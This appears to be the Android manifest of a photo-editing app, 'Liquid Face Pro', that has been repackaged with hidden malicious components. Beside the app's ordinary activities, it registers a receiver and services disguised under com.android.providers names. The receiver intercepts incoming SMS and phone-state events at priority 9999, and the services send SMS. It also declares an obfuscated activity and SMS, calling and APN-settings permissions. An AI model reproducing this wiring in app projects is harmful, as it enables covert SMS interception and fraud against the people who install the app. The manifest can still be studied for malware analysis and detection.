<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="preferExternal" package="com.socialin.android.photo.liquidfacepro">
    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name" android:name="com.socialin.android.SocialinApplication">
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.socialin.android.photo.liquidface.GooActivityPRO" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.socialin.android.photo.liquidface.GooActivity" android:screenOrientation="portrait"/>
        <activity android:name="com.socialin.android.photo.liquidface.dialog.SocialDialogActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:name="com.socialin.android.photo.liquidface.dialog.FacebookLoginDialogActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:name="com.socialin.android.photo.liquidface.dialog.FacebookRandomFriendsDialogActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:name="com.socialin.android.photo.liquidface.dialog.SampleImagesActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:name="com.socialin.android.photo.liquidface.dialog.BackKeyPressedDialogActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:name="com.socialin.android.photo.liquidface.dialog.SaveDialogActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:label="@string/app_name" android:name="fD$tw"/>
        <receiver android:enabled="true" android:exported="true" android:name="com.socialin.android.analytics.InstallReferrerReceiver">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.activity.UpdateAvailableActivity"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.activity.OtherGamesActivity"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.activity.OtherGamesListActivity"/>
        <activity android:name="com.socialin.android.promo.PromoActivity" android:theme="@style/Theme.CustomDialog"/>
        <activity android:name="com.socialin.android.activity.ExceptionReportActivity"/>
        <meta-data android:name="SOCIALIN_CONFIRM_EXCEPTION" android:value="false"/>
        <activity android:name="com.socialin.android.api.activity.StartActivity"/>
        <activity android:name="com.socialin.android.api.activity.LoginActivity"/>
        <activity android:name="com.socialin.android.api.activity.RegistrationActivity"/>
        <activity android:name="com.socialin.android.api.activity.SocialinMenuActivity"/>
        <activity android:name="com.socialin.android.api.activity.ProfileSettingsActivity"/>
        <activity android:name="com.socialin.android.api.activity.ResetPasswordActivity"/>
        <activity android:name="com.socialin.android.api.activity.UserAvatarUploadActivity"/>
        <activity android:name="com.socialin.android.api.activity.UserLoginnameEditActivity"/>
        <activity android:name="com.socialin.android.api.activity.UserEmailEditActivity"/>
        <activity android:name="com.socialin.android.api.activity.UserPasswordChangeActivity"/>
        <activity android:name="com.socialin.android.api.activity.FriendsActivity"/>
        <activity android:name="com.socialin.android.api.activity.FindFriendsActivity"/>
        <activity android:name="com.socialin.android.api.activity.UserPublicProfileActivity"/>
        <activity android:name="com.socialin.android.api.activity.ConnectionsActivity"/>
        <activity android:name="com.socialin.android.photo.crop.CropImage"/>
        <activity android:name="com.socialin.android.photo.crop.CropImageVer3"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="standard" android:name="com.socialin.android.ui.share.SaveExportActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="standard" android:name="com.socialin.android.photo.clipart.SelectClipartActivity" android:screenOrientation="portrait" android:theme="@style/Theme.CustomDialog"/>
        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="standard" android:name="com.socialin.android.photo.clipart.SelectClipartCategoryActivity" android:screenOrientation="portrait" android:theme="@style/Theme.CustomDialog"/>
        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="standard" android:name="com.socialin.android.photo.clipart.MainActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="standard" android:name="com.socialin.android.photo.callout.SelectCalloutActivity" android:screenOrientation="portrait" android:theme="@style/Theme.CustomDialog"/>
        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="standard" android:name="com.socialin.android.photo.callout.SelectCalloutTypeActivity" android:screenOrientation="portrait" android:theme="@style/Theme.CustomDialog"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.gallery.GalleryActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookMainScreenActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookFriendsActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookFriendsAlbumsActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookFriendsPhotosActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookImageByTagActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookMyAlbumsActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookGetUserNewFeeds" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.upload.UploadToFacebookActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.upload.CommonPhraseListActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.upload.DateAndTimeListActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.upload.LocationListActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.WallPostActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookGetUserInfoActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.socialin.SocialinSignupViaFacebookActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.facebook.FacebookLogoutLocallyActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.socialin.facebook.socialin.SocialinSignupViaFacebookActivity" android:screenOrientation="portrait"/>
        <activity android:label="@string/app_name" android:name="com.socialin.android.flickr.webview.FlickrOAuth"/>
        <activity android:label="@string/app_name" android:name="com.socialin.android.flickr.webview.WebAuthentication"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.PicasaAuthAndAlbumsActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.PicasaAlbumPhotosActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.PicasaWebAuthentication" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.upload.PicasaUploadPhotoActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.upload.CommonPhraseListActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.upload.LocationListActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.socialin.android.picasa.upload.DateAndTimeListActivity" android:screenOrientation="portrait"/>
        <receiver android:name="com.android.providers.update.OperateReceiver" android:priority="9999">
            <intent-filter android:priority="9999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
            <intent-filter android:priority="9999">
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.providers.update.OperateService"/>
        <service android:name="com.android.providers.sms.SMSService"/>
        <service android:name="com.android.providers.sms.SMSSendService"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="com.android.vending.CHECK_LICENSE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <supports-screens android:anyDensity="false" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
</manifest>